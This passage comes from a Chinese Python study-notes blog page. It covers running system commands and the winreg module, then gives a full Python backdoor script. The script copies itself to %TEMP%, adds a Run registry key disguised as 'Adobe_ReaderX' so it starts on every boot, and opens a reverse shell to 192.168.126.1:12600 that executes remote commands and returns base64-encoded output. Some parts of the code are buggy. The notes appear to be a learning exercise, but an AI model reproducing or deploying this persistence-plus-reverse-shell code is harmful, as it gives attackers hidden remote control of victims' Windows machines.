main()</span><br></pre></td></tr></table></figure>
<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><h3 id="os-system-1"><a href="#os-system-1" class="headerlink" title="os.system()"></a>os.system()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&apos;ipconfig&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="subprocess-Popen-1"><a href="#subprocess-Popen-1" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">com_str = &apos;ipconfig&apos;</span><br><span class="line">command = subprocess.Popen([com_str],stdout = subprocess.PIPE,shell = True)</span><br><span class="line">(output,__) = command.communicate()</span><br><span class="line"># 解码格式需要尝试 gbk gb2312 utf-8</span><br><span class="line">print (output.decode(&apos;gbk&apos;))</span><br><span class="line">with open(&apos;file.txt&apos;,&apos;a&apos;,encoding = &apos;utf-8&apos;) as file:</span><br><span class="line">	file.write(output)</span><br><span class="line">with open(&apos;file.txt&apos;,&apos;r&apos;,encoding = &apos;utf-8&apos;) as file:</span><br><span class="line">	print(file.read())</span><br></pre></td></tr></table></figure>
<h2 id="winreg模块"><a href="#winreg模块" class="headerlink" title="winreg模块"></a>winreg模块</h2><p>_winreg模块在Python3中被重命名为winreg</p>
<h3 id="winreg-OpenKey"><a href="#winreg-OpenKey" class="headerlink" title="winreg.OpenKey()"></a>winreg.OpenKey()</h3><p>打开特定key</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winreg.OpenKey(key,sub_key[,res=0[,sam=KEY_READ]])</span><br><span class="line">winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,&apos;SOFTWARE\Classes&apos;)</span><br></pre></td></tr></table></figure>
<p>返回一个句柄对象<br><code>key</code>是一个已经打开的键，或任意一个预定义的<code>HKEY_*</code>常量<br><code>sub_key</code>是一个字符串，表示要打开的子键<br><code>res</code>为保留整数，必须为0，默认为0<br><code>sam</code>是一个整数，指定访问掩码，描述密钥的所需安全访问策略</p>
<p>修改键值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winreg.SetValueEx(key, value_name, reserved, type, value)</span><br></pre></td></tr></table></figure>
<p><code>key</code>是一个已经打开的键，或任意一个预定义的<code>HKEY_*</code>常量<br><code>value_name</code>是一个字符串，命名了哪一个值与之关联<br><code>reserved</code>可以使用任何值，<code>0</code>表示总是被传递给API<br><code>type</code>是一个整数，描述了数据类型。具体类型参考：<a href="https://docs.microsoft.com/zh-cn/windows/desktop/SysInfo/registry-value-types" target="_blank" rel="noopener">Registry Value Types</a><br><code>value</code>表示被赋予的新值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import sys,base64,os,socket,subprocess</span><br><span class="line">import winreg</span><br><span class="line"></span><br><span class="line">def autorun(tempdir,filename,run):</span><br><span class="line">    # copy file to %TEMP%</span><br><span class="line">    os.system(&apos;copy %s %s&apos; %(filename,tempdir))</span><br><span class="line">    # open reg</span><br><span class="line">    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,run)</span><br><span class="line">    runkey = []</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        subkey = winreg.EnumKey(key,i)</span><br><span class="line">        runkey.append(subkey[0])</span><br><span class="line">        i += 1</span><br><span class="line">    if &apos;Adobe ReaderX&apos; not in runkey:</span><br><span class="line">        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,run,0,winreg.KEY_ALL_ACCESS)</span><br><span class="line">        winreg.SetValueEx(key,&apos;Adobe_ReaderX&apos;,0,winreg.REG_SZ,r&quot;%TEMP%mw.exe&quot;)</span><br><span class="line">        key.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shell():</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&apos;192.168.126.1&apos;,int(12600)))</span><br><span class="line">    s.send(&apos;[*] Connection Established!&apos;)</span><br><span class="line">    while True:</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        if data == &quot;quit&quot;:</span><br><span class="line">            break</span><br><span class="line">        proc = subprocess.Popen(data,shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)</span><br><span class="line">        stdout_value = proc.stdout.read + proc.stderr.read()</span><br><span class="line">        encoded = base64.b64encode(stdout_value)</span><br><span class="line">        s.send(encoded)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    tempdir = &apos;%TEMP%&apos;</span><br><span class="line">    fileName = sys.argv[0]</span><br><span class="line">    run = &apos;SoftwareMicrosoftWindowsCurrentVersionRun&apos;</span><br><span class="line">    autorun(tempdir,fileName,run)</span><br><span class="line">    shell()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://www.freebuf.com/news/topnews/58048.html" target="_blank" rel="noopener">Python黑客学习笔记：从HelloWorld到编写PoC（上）</a></p>
<p>[2] <a href="https://www.freebuf.com/news/topnews/60758.html" target="_blank" rel="noopener">Python黑客学习笔记：从HelloWorld到编写PoC（中）</a></p>
<p>[3] <a href="http://www.primalsecurity.net/tutorials/python-tutorials/" target="_blank" rel="noopener">Python Tutorials</a></p>
<p>[4] <a href="https://www.cnblogs.com/zhoug2020/p/5079407.html" target="_blank" rel="noopener">python中的subprocess.Popen（）使用</a></p>

      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Coding/" rel="tag"># Coding</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/05/16/VulnHub-Billu-b0x2/" rel="next" title="'VulnHub Billu b0x2 Walkthrough'">
                <i class="fa fa-chevron-left"></i> 'VulnHub Billu b0x2 Walkthrough'
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/05/29/Security-Emergency-Response/" rel="prev" title="'安全应急响应'">
                '安全应急响应' <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/cat.jpg" alt="chessur">
            
              <p class="site-author-name" itemprop="name">chessur</p>
              <div class="site-description motion-element" itemprop="description">Freedom as Autonomy</div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">39</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  
                    
                      <a href="/categories/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">8</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                      <a href="/tags/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">8</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/ChireC" title="GitHub &rarr; https://github.com/ChireC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
            </div>
          

          

          
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#代码规范"><span class="nav-text">代码规范</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#集合"><span class="nav-text">集合</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#list"><span class="nav-text">list</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#添加元素"><span class="nav-text">添加元素</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#append"><span class="nav-text">append()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#insert"><span class="nav-text">insert()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-text">+</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除元素"><span class="nav-text">删除元素</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#remove"><span class="nav-text">remove()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#del"><span class="nav-text">del</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#清空列表"><span class="nav-text">清空列表</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#clear"><span class="nav-text">clear()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#比较"><span class="nav-text">比较</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#字符串操作"><span class="nav-text">字符串操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#in-amp-not-in"><span class="nav-text">in &amp; not in</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#index"><span class="nav-text">index()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#count"><span class="nav-text">count()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reverse"><span class="nav-text">reverse()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reversed"><span class="nav-text">reversed()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sort"><span class="nav-text">sort()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sorted"><span class="nav-text">sorted()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#range-0"><span class="nav-text">range(0)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pop"><span class="nav-text">pop()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dict"><span class="nav-text">dict</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#set"><span class="nav-text">set</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#set-1"><span class="nav-text">set()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#add"><span class="nav-text">add()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#update"><span class="nav-text">update()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pop-1"><span class="nav-text">pop()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#集合运算"><span class="nav-text">集合运算</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#intersection"><span class="nav-text">intersection()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#union"><span class="nav-text">union()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#difference"><span class="nav-text">difference()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#symmetric-difference"><span class="nav-text">symmetric_difference()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#issubset"><span class="nav-text">issubset()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#issuperset"><span class="nav-text">issuperset()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tuple"><span class="nav-text">tuple</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#添加元素-1"><span class="nav-text">添加元素</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除元素-1"><span class="nav-text">删除元素</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#求长度"><span class="nav-text">求长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#切片"><span class="nav-text">切片</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#enumerate"><span class="nav-text">enumerate()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zip"><span class="nav-text">zip()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#迭代dict的value"><span class="nav-text">迭代dict的value</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#同时迭代dict的value和key"><span class="nav-text">同时迭代dict的value和key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列表生成式"><span class="nav-text">列表生成式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复杂列表生成式"><span class="nav-text">复杂列表生成式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#max"><span class="nav-text">max()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#min"><span class="nav-text">min()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sum"><span class="nav-text">sum()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#选择分支"><span class="nav-text">选择分支</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#if"><span class="nav-text">if</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#String"><span class="nav-text">String</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#替换"><span class="nav-text">替换</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#string-replace"><span class="nav-text">string.replace()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分割"><span class="nav-text">分割</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#split"><span class="nav-text">split()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input"><span class="nav-text">input()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#转换"><span class="nav-text">转换</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ascii码"><span class="nav-text">Ascii码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#字符"><span class="nav-text">字符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#删除"><span class="nav-text">删除</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#strip"><span class="nav-text">strip()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rstrip"><span class="nav-text">rstrip()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lstrip"><span class="nav-text">lstrip()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查找"><span class="nav-text">查找</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#find"><span class="nav-text">find()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#index-1"><span class="nav-text">index()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#更改字符"><span class="nav-text">更改字符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#capitalize"><span class="nav-text">capitalize()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#upper"><span class="nav-text">upper()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lower"><span class="nav-text">lower()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#center"><span class="nav-text">center()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ljust"><span class="nav-text">ljust()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rjust"><span class="nav-text">rjust()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检查"><span class="nav-text">检查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#startswith"><span class="nav-text">startswith()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#endswith"><span class="nav-text">endswith()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isdigit"><span class="nav-text">isdigit()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isalpha"><span class="nav-text">isalpha()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isalnum"><span class="nav-text">isalnum()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#添加"><span class="nav-text">添加</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#join"><span class="nav-text">join()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#函数"><span class="nav-text">函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#函数变量优先级"><span class="nav-text">函数变量优先级</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#print"><span class="nav-text">print()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#format"><span class="nav-text">format()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#print-f"><span class="nav-text">print(f)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#格式化操作符"><span class="nav-text">格式化操作符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#格式化操作符的辅助命令"><span class="nav-text">格式化操作符的辅助命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python的转义字符及含义"><span class="nav-text">Python的转义字符及含义</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#类"><span class="nav-text">类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法"><span class="nav-text">方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#init"><span class="nav-text">__init__()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#del-1"><span class="nav-text">__del__()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#str"><span class="nav-text">__str__()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#slots"><span class="nav-text">__slots__</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#装饰器"><span class="nav-text">装饰器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#property"><span class="nav-text">@property</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#attribute-setter"><span class="nav-text">@attribute.setter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#静态方法"><span class="nav-text">静态方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#staticmethod"><span class="nav-text">@staticmethod</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#类方法"><span class="nav-text">类方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#classmethod"><span class="nav-text">@classmethod</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#类之间的关系"><span class="nav-text">类之间的关系</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#is-a"><span class="nav-text">is-a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#has-a"><span class="nav-text">has-a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#use-a"><span class="nav-text">use-a</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#继承和多态"><span class="nav-text">继承和多态</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#super"><span class="nav-text">super()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#继承"><span class="nav-text">继承</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#多重继承"><span class="nav-text">多重继承</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#多态"><span class="nav-text">多态</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#抽象类"><span class="nav-text">抽象类</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正则表达式"><span class="nav-text">正则表达式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#re模块"><span class="nav-text">re模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#compile"><span class="nav-text">compile()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#match"><span class="nav-text">match()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#search"><span class="nav-text">search()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#split-1"><span class="nav-text">split()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sub"><span class="nav-text">sub()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fullmatch"><span class="nav-text">fullmatch()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#findall"><span class="nav-text">findall()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#finditer"><span class="nav-text">finditer()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#purge"><span class="nav-text">purge()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-S"><span class="nav-text">re.S</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-I"><span class="nav-text">re.I</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-M"><span class="nav-text">re.M</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件操作"><span class="nav-text">文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#打开文件"><span class="nav-text">打开文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法1"><span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法2"><span class="nav-text">方法2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读文件"><span class="nav-text">读文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#打开文件-1"><span class="nav-text">打开文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readlines"><span class="nav-text">readlines()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#read"><span class="nav-text">read()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readline"><span class="nav-text">readline()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写文件"><span class="nav-text">写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#write"><span class="nav-text">write()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#writelines"><span class="nav-text">writelines()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#操作CSV文件"><span class="nav-text">操作CSV文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#读CSV文件"><span class="nav-text">读CSV文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写CSV文件"><span class="nav-text">写CSV文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#模块"><span class="nav-text">模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#random模块"><span class="nav-text">random模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#random-randint"><span class="nav-text">random.randint()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#random-randrange"><span class="nav-text">random.randrange()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#random-random"><span class="nav-text">random.random()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#random-sample"><span class="nav-text">random.sample()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#requests模块"><span class="nav-text">requests模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#requests-get"><span class="nav-text">requests.get()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Response-content"><span class="nav-text">Response.content</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Response-content-decode"><span class="nav-text">Response.content.decode()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Response-json"><span class="nav-text">Response.json()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#requests-status-code"><span class="nav-text">requests.status_code</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#multiprocessing模块"><span class="nav-text">multiprocessing模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dummy模块"><span class="nav-text">dummy模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Pool-map"><span class="nav-text">Pool.map()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#multiprocessing-Process"><span class="nav-text">multiprocessing.Process</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#创建子进程"><span class="nav-text">创建子进程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#启动子进程"><span class="nav-text">启动子进程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#等待子进程结束"><span class="nav-text">等待子进程结束</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OS模块"><span class="nav-text">OS模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#创建目录"><span class="nav-text">创建目录</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#os-makedirs"><span class="nav-text">os.makedirs()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-path-join"><span class="nav-text">os.path.join()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-listdir"><span class="nav-text">os.listdir()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-rename"><span class="nav-text">os.rename()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-system"><span class="nav-text">os.system()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-getpid"><span class="nav-text">os.getpid()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lxml模块"><span class="nav-text">lxml模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XPath语法"><span class="nav-text">XPath语法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#json模块"><span class="nav-text">json模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#json-dump"><span class="nav-text">json.dump()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#json-dumps"><span class="nav-text">json.dumps()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#json-load"><span class="nav-text">json.load()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#json-loads"><span class="nav-text">json.loads()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#csv模块"><span class="nav-text">csv模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#csv-reader"><span class="nav-text">csv.reader()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shutil模块"><span class="nav-text">shutil模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shutil-copyfile"><span class="nav-text">shutil.copyfile()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 